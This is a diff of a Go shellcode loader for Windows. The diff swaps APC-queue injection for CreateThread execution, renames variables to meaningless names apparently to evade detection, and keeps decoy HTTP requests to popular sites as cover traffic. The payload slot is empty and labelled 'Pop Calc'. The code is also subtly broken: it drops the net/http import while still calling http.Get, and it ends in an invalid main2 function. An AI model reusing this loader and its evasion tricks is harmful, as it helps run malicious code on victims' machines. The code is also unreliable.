@@ -6,7 +6,6 @@ import (
 	"fmt"
 	"log"
 	"math/rand"
-	"net/http"
 	"sync"
 	"time"
 
@@ -20,128 +19,113 @@ const (
 	PAGE_READWRITE = 0x04
 )
 
-const (
-	QUEUE_USER_APC_FLAGS_NONE = iota
-	QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC
-	QUEUE_USER_APC_FLAGS_MAX_VALUE
-)
-
-var shellcode = []byte{0x90, 0x90, 0x90, 0x90} // Replace with actual shellcode
-
 func main() {
-	verbose := flag.Bool("verbose", false, "Enable verbose output")
-	debug := flag.Bool("debug", false, "Enable debug output")
+	varise := flag.Bool("verbose", false, "Enable verbose output")
+	dubbe := flag.Bool("debug", false, "Enable debug output")
 	flag.Parse()
 
-	if *debug {
-		fmt.Println("[DEBUG]Loading kernel32.dll and ntdll.dll...")
+	// Pop Calc Shellcode
+	scShell, errShellcode := hex.DecodeString("")
+	if errShellcode != nil {
+		log.Fatal(fmt.Sprintf("[!]there was an error decoding the string to a hex byte array: %s", errShellcode.Error()))
 	}
-	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
-	ntdll := windows.NewLazySystemDLL("ntdll.dll")
 
-	if *debug {
-		fmt.Println("[DEBUG]Loading VirtualAlloc, VirtualProtect, and RtlCopyMemory procedures...")
+	if *dubbe {
+		fmt.Println("[DEBUG]Loading kernel32.dll and ntdll.dll")
 	}
-	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
-	VirtualProtect := kernel32.NewProc("VirtualProtect")
-	GetCurrentThread := kernel32.NewProc("GetCurrentThread")
-	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
-	NtQueueApcThreadEx := ntdll.NewProc("NtQueueApcThreadEx")
+	kernelDLL := windows.NewLazySystemDLL("kernel32.dll")
+	ntdllDLL := windows.NewLazySystemDLL("ntdll.dll")
 
-	if *debug {
-		fmt.Println("[DEBUG]Calling VirtualAlloc for shellcode...")
+	if *dubbe {
+		fmt.Println("[DEBUG]Loading VirtualAlloc, VirtualProtect and RtlCopyMemory procedures")
 	}
-	addr, _, errVirtualAlloc := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
+	a := kernelDLL.NewProc("VirtualAlloc")
+	b := kernelDLL.NewProc("VirtualProtect")
+	c := ntdllDLL.NewProc("RtlCopyMemory")
+	d := kernelDLL.NewProc("CreateThread")
+	e := kernelDLL.NewProc("WaitForSingleObject")
+
+	if *dubbe {
+		fmt.Println("[DEBUG]Calling VirtualAlloc for shellcode")
+	}
+	f, _, errVirtualAlloc := a.Call(0, uintptr(len(scShell)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
 
 	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
 		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error()))
 	}
 
-	if addr == 0 {
+	if f == 0 {
 		log.Fatal("[!]VirtualAlloc failed and returned 0")
 	}
 
-	if *verbose {
-		fmt.Println(fmt.Sprintf("[-]Allocated %d bytes", len(shellcode)))
+	if *varise {
+		fmt.Println(fmt.Sprintf("[-]Allocated %d bytes", len(scShell)))
 	}
 
-	if *debug {
-		fmt.Println("[DEBUG]Copying shellcode to memory with RtlCopyMemory...")
+	if *dubbe {
+		fmt.Println("[DEBUG]Copying shellcode to memory with RtlCopyMemory")
 	}
-	_, _, errRtlCopyMemory := RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
+	_, _, errRtlCopyMemory := c.Call(f, uintptr(unsafe.Pointer((*byte)(unsafe.Pointer(&scShell[0])))), uintptr(len(scShell)))
 
 	if errRtlCopyMemory != nil && errRtlCopyMemory.Error() != "The operation completed successfully." {
 		log.Fatal(fmt.Sprintf("[!]Error calling RtlCopyMemory:\r\n%s", errRtlCopyMemory.Error()))
 	}
-	if *verbose {
+	if *varise {
 		fmt.Println("[-]Shellcode copied to memory")
 	}
 
-	if *debug {
-		fmt.Println("[DEBUG]Calling VirtualProtect to change memory region to PAGE_EXECUTE_READ...")
+	if *dubbe {
+		fmt.Println("[DEBUG]Calling VirtualProtect to change memory region to PAGE_EXECUTE_READ")
 	}
 
-	oldProtect := PAGE_READWRITE
-	_, _, errVirtualProtect := VirtualProtect.Call(addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
+	oldProt := PAGE_READWRITE
+	_, _, errVirtualProtect := b.Call(f, uintptr(len(scShell)), PAGE_EXECUTE, uintptr(unsafe.Pointer((*uintptr)(unsafe.Pointer(&oldProt)))))
 	if errVirtualProtect != nil && errVirtualProtect.Error() != "The operation completed successfully." {
 		log.Fatal(fmt.Sprintf("Error calling VirtualProtect:\r\n%s", errVirtualProtect.Error()))
 	}
-	if *verbose {
+	if *varise {
 		fmt.Println("[-]Shellcode memory region changed to PAGE_EXECUTE_READ")
 	}
 
-	if *debug {
-		fmt.Println("[DEBUG]Calling GetCurrentThread...")
-	}
-	thread, _, err := GetCurrentThread.Call()
-	if err.Error() != "The operation completed successfully." {
-		log.Fatal(fmt.Sprintf("Error calling GetCurrentThread:\n%s", err))
-	}
-	if *verbose {
-		fmt.Printf("[-]Got handle to current thread: %v\n", thread)
+	if *dubbe {
+		fmt.Println("[DEBUG]Calling CreateThread...")
 	}
 
-	if *debug {
-		fmt.Println("[DEBUG]Calling NtQueueApcThreadEx...")
-	}
-	_, _, err = NtQueueApcThreadEx.Call(thread, QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC, uintptr(addr), 0, 0, 0)
-	if err.Error() != "The operation completed successfully." {
-		log.Fatal(fmt.Sprintf("Error calling NtQueueApcThreadEx:\n%s", err))
-	}
-	if *verbose {
-		fmt.Println("[-]Queued special user APC")
-	}
+	threadID, _, errCreateThread := d.Call(0, 0, f, uintptr(0), 0, 0)
 
-	if *verbose {
+	if errCreateThread != nil && errCreateThread.Error() != "The operation completed successfully." {
+		log.Fatal(fmt.Sprintf("[!]Error calling CreateThread:\r\n%s", errCreateThread.Error()))
+	}
+	if *varise {
 		fmt.Println("[+]Shellcode Executed")
 	}
-}
 
-func init() {
-	rand.Seed(time.Now().UnixNano())
-}
-
-func fetchRandomURLs() {
-	numUrls := 3
-	urls := make([]string, numUrls)
-
-	for i := 0; i < numUrls; i++ {
-		urls[i] = fmt.Sprintf("https://%s.com", getRandomDomain())
+	if *dubbe {
+		fmt.Println("[DEBUG]Calling WaitForSingleObject...")
 	}
 
-	for _, url := range urls {
-		go func(url string) {
-			resp, err := http.Get(url)
+	_, _, errWaitForSingleObject := e.Call(threadID, 0xFFFFFFFF)
+	if errWaitForSingleObject != nil && errWaitForSingleObject.Error() != "The operation completed successfully." {
+		log.Fatal(fmt.Sprintf("[!]Error calling WaitForSingleObject:\r\n:%s", errWaitForSingleObject.Error()))
+	}
+}
+
+func requestAlexaDomains() {
+	domains := []string{"www.yandex.ru", "www.google.com", "www.facebook.com"}
+	for i := 0; i < 3; i++ {
+		go func(domain string) {
+			resp, err := http.Get("https://" + domain + "/")
 			if err != nil {
-				log.Printf("Error fetching %s: %s", url, err)
+				log.Println("Error making request:", err)
 			} else {
-				defer resp.Body.Close()
+				resp.Body.Close()
+				log.Println("Successfully made request to", domain)
 			}
-		}(url)
+		}(domains[i])
 	}
 }
 
-func getRandomDomain() string {
-	domains := []string{"google", "facebook", "amazon", "youtube", "twitter", "wikipedia", "qq", "taobao", "baidu", "jd", "alibaba", "sina", "sohu", "netease", "tencent", "wechat", "linkedin", "github", "reddit", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter"}
-	return domains[rand.Intn(len(domains))]
+func main2() {
+	requestAlexaDomains()
+	sync.WaitGroup{}
 }
